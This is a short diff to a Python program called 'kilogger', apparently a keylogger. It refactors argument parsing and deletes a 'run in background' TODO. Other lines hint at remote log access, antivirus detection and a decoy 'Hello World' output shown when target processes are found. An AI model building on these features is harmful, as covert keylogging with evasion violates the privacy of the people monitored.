@@ -18,7 +18,6 @@ is provided "as is" without warranties.
 Author: Antonino Lorenzo
 Version: 1.0.0
 
-TODO [ ]: automatically run in background
 TODO [ ]: Implement capture copy to clipboard functionality
 TODO [ ]: Remote access to logs
 TODO [ ]: executable gets detected by: see .report
@@ -287,11 +286,14 @@ def friendly_check():
     return target_killed or target_found
 
 
-def main():
+def main(argv = None):
     """
     Main function of the kilogger program.
     """
     # --- Setup argparse
+    if argv is None:
+        argv = sys.argv
+
     parser = argparse.ArgumentParser()
 
     parser.add_argument(
@@ -317,7 +319,8 @@ def main():
         'note: process names should be separated by ", ".'
     )
 
-    args = parser.parse_args()
+    args = parser.parse_args(argv[1:])
+
     if ((not (args.force and args.force == 1))
             and friendly_check()):  # big brain time
         print('Hello World')
